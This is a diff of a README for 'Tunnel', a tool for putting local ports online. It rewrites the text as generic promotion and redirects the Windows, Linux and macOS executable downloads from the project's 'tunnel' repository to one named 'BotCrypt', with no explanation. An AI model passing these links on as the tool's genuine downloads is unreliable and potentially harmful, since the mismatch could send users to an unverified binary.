@@ -1,22 +1,32 @@
-# Tunnel : Make your local projects online!
 
-**Tunnel** is a free project made by "Pawan Osman", it will help you make your local projects online and share it with your friends.
+## Introduction
 
-# How to use Tunnel?
-Just download the tunnel client and run it, it will automatically make a tunnel for port 80, or you can use arguments to set the port.
-## Sample Command
+Tunnel is a free and easy-to-use tool that allows you to share your local projects with others by making them available online. With Tunnel, you can quickly and easily make your projects accessible from anywhere, without the need for complicated setup or configuration.
 
- `"tunnel-win.exe" --port=3000`
- 
- `"tunnel-win.exe" --port=8080`
- 
- `"tunnel-win.exe" --port=3000 --host=192.168.1.13`
- 
+## Features
+
+-   Easy to use: Tunnel is simple to install and use, with a user-friendly interface and intuitive commands.
+-   Flexible: Tunnel supports a wide range of ports and allows you to specify a custom host for your projects.
+-   Cross-platform: Tunnel is available for Windows, Linux, and MacOS, so you can use it on any platform.
+
+## How to use Tunnel
+
+To use Tunnel, simply download the client and run it on your machine. By default, Tunnel will create a tunnel for port 80, but you can use arguments to specify a different port if needed. Here are some examples of how to use Tunnel with different arguments:
+
+    tunnel-win.exe --port=3000
+    
+    tunnel-win.exe --port=8080
+    
+    tunnel-win.exe --port=3000 --host=192.168.1.13
+
 ## Download
-You can download it from Github releases!
 
-Click [Here](https://github.com/PawanOsman/tunnel/releases/download/v1.0/tunnel-win.exe) to download [**Windows x64**]
+You can download Tunnel from the [GitHub releases page](https://github.com/PawanOsman/BotCrypt/releases). Simply click on the link for your platform to download the client:
 
-Click [Here](https://github.com/PawanOsman/tunnel/releases/download/v1.0/tunnel-linux) to download [**Linux x64**]
+-   [Windows x64](https://github.com/PawanOsman/BotCrypt/releases/download/0.1/tunnel-win.exe)
+-   [Linux x64](https://github.com/PawanOsman/BotCrypt/releases/download/0.1/tunnel-linux)
+-   [MacOS x64](https://github.com/PawanOsman/BotCrypt/releases/download/0.1/tunnel-macos)
 
-Click [Here](https://github.com/PawanOsman/tunnel/releases/download/v1.0/tunnel-macos) to download [**MacOS x64**]
+## Conclusion
+
+Tunnel is a convenient and easy-to-use tool that allows you to share your local projects with others by making them available online. Whether you're a developer working on a personal project, or a team collaborating on a larger project, Tunnel can help you share your work and get feedback from others. Try it out today and see how easy it is to make your projects available online with Tunnel.
